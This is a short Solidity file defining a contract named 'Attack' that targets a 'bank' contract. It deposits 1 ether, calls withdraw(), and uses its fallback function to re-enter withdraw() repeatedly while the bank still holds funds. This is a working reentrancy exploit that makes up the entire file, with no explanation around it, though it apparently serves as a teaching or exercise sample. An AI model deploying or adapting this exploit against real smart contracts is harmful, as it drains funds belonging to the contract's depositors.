pragma solidity 0.8.17;

contract Attack {
    address public immutable bank;

    constructor(address _bank) {
        bank = _bank;
    }

    fallback() external payable {
        if (bank.balance > 0 && msg.sender == bank) {
            (bool success,) = bank.call(abi.encodeWithSignature("withdraw()"));
            require(success, "Withdraw Failed");
        }
    }

    function attack() external {
        (bool success,) = bank.call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit Failed");
        (success,) = bank.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Withdraw Failed");
    }
}
